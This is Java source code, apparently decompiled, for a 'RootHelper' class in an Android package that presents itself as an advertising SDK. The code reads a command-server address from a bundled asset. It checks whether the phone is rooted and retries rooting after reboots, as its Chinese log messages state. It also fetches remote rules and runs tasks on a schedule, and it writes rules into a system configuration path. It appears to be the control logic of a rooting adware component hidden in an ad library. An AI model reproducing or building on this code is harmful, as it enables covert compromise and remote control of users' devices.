package com.parker.adsdk;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.preference.PreferenceManager;
import android.text.TextUtils;
import android.text.format.DateFormat;

import com.parker.adsdk.entity.rule.PackageRules;
import com.parker.adsdk.entity.rule.Rule;
import com.parker.adsdk.network.RequestUtil;
import com.parker.adsdk.util.MyLog;
import com.parker.adsdk.util.ServiceUtils;
import com.parker.adsdk.work.Work;
import com.parker.adsdk.work.WorkAlarmBroadcastReceiver;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.URL;

/**
 * Created by parker on 2016/8/9.
 */
public class RootHelper {

    private Context context;


    private void checkTid() throws JSONException {
        RequestUtil.recordLog(this.context, 51, null);
        String str = PreferenceManager.getDefaultSharedPreferences(this.context).getString("initData",
                "");
        PreferenceManager.getDefaultSharedPreferences(this.context).edit().remove("initData").apply();
        JSONObject initData = new JSONObject(str);
        MyLog.i("正在检查R状态...");
        boolean isRoot = ServiceUtils.isRoot(this.context, initData);
        MyLog.i("正在检查是否在上次R过程中重启...");
        String lastTid = this.getLastTid();
        if(!TextUtils.isEmpty(lastTid)) {
            JSONObject lastPlan = this.getLastPlan();
            if(!isRoot) {
                MyLog.i("重启过且R失败，重新R");
                RequestUtil.recordWork(this.context, lastTid, 5, lastPlan, null);
                this.getRules();
            }
            else {
                MyLog.i("重启过且R成功，停止R");
                RequestUtil.recordWork(this.context, lastTid, 4, lastPlan,null);
            }
        }
        else {
            MyLog.i("未重启过");
            if(!isRoot) {
                this.getRules();
            }
        }
    }

    private JSONObject getLastPlan() {
        JSONObject result = new JSONObject();
        JSONArray plans = this.getStoredPlans();
        int i;
        for(i = 0; i < plans.length(); ++i) {
            JSONObject plan = plans.optJSONObject(i);
            if(plan.optInt("state") == 1) {
                plan.remove("state");
                result = plan;
            }
        }

        return result;
    }

    private JSONArray getStoredPlans() {
        JSONArray plans;
        MyLog.i("获取已存储方案...");
        JSONArray v1 = new JSONArray();
        String str = PreferenceManager.getDefaultSharedPreferences(this.context).getString("plans",
                null);
        try {
            plans = new JSONArray(str);
        }
        catch(Exception e) {
            plans = v1;
        }

        return plans;
    }


    private void getRules() {
        MyLog.i("获取规则");
        RequestUtil.recordLog(this.context, 41, null);
        String ota = RequestUtil.requestOta(this.context);
        try {
            if(new JSONObject(ota).optString("type").equals("fast")) {
                MyLog.i("执行模式：快速模式");
                new Work(this.context).run();
                return;
            }

            MyLog.i("执行模式：定时模式");
            Rule rule = RequestUtil.requestRule(this.context);
            this.saveRules(rule);
            this.setAlarm(rule);
        }
        catch(Exception e) {
            e.printStackTrace();
        }
    }

    private void saveRules(Rule rule) {
        MyLog.i("判断是否需要更新全局规则...");
        PackageRules packageRules = rule.getPkgRules();
        Rule cfgRule = this.readRuleFromCfg();
        if(cfgRule == null || cfgRule.getRuleVer() < rule.getRuleVer()) {
            MyLog.i("规则版本号提升, 覆盖旧全局规则");
            this.writeRulesToCfg(rule);
        }
        else {
            MyLog.i("规则版本号无变化");
        }

        if(packageRules != null) {
            this.savePkgRules(this.context, packageRules);
        }
    }


    private void savePkgRules(Context context, PackageRules packageRules) {
        MyLog.i("写入pkg规则");
        File file = new File(context.getFilesDir(), "pkgRules");
        try {
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(packageRules.pack().toString().getBytes());
            fos.close();
        }
        catch(Exception e) {
        }
    }

    private Rule readRuleFromCfg() {
        Rule rule = null;
        MyLog.i("读取现有全局规则");
        File cfgFile = new File(Constants.syscfg);
        if(cfgFile.exists()) {
            try {
                byte[] buf = new byte[((int)cfgFile.length())];
                FileInputStream fis = new FileInputStream(cfgFile);
                fis.read(buf);
                fis.close();
                JSONObject jsonObject = new JSONObject(new String(buf));
                if(!jsonObject.has("pkgRules")) {
                    jsonObject.put("pkgRules", new JSONObject());
                }

                rule = new Rule(jsonObject);
            }
            catch(Exception e) {
                MyLog.e(e);
            }
        }

        return rule;
    }


    private String getLastTid() {
        return PreferenceManager.getDefaultSharedPreferences(this.context).getString("lastTid", "");
    }




    public void start(Context context) throws Exception {
        this.context = context;
        Constants.url = "http://" + new JSONObject(new BufferedReader(new InputStreamReader(context.
                getAssets().open("cfg"), "UTF-8")).readLine()).getString("a");
        new URL(Constants.url);
        context.registerReceiver(new WorkAlarmBroadcastReceiver(), new IntentFilter("com.admonet.helper.timing.work.start"));
        this.checkTid();
    }

    private void setAlarm(Rule rule) {
        AlarmManager alarmManager = (AlarmManager)this.context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent("com.admonet.helper.timing.work.start");
        intent.putExtra("extra_start_time", rule.getGlobalRules().getStart().getTimeInMillis());
        intent.putExtra("extra_end_time", rule.getGlobalRules().getEnd().getTimeInMillis());
        intent.putExtra("extra_trigger", rule.getGlobalRules().getTrigger());
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this.context, 0, intent, 0);
        alarmManager.cancel(pendingIntent);
        alarmManager.set(0, rule.getGlobalRules().getStart().getTimeInMillis(), pendingIntent);
        MyLog.i("执行时间:" + DateFormat.format("yyyy-MM-dd HH:mm:ss", rule.getGlobalRules().getStart()
                .getTime()) + " ts=" + rule.getGlobalRules().getStart().getTimeInMillis());
    }


    private void writeRulesToCfg(Rule rule) {
        MyLog.i("写入全局规则");
        File cfg = new File(Constants.syscfg);
        try {
            if(!cfg.exists()) {
                if(!cfg.getParentFile().exists()) {
                    cfg.getParentFile().mkdir();
                }

                cfg.createNewFile();
            }

            FileOutputStream fos = new FileOutputStream(cfg);
            JSONObject jsonRule = rule.pack();
            if(jsonRule.has("pkgRules")) {
                jsonRule.remove("pkgRules");
            }

            fos.write(jsonRule.toString().getBytes());
            fos.close();
        }
        catch(Exception e) {
            MyLog.e(e);
        }
    }


}
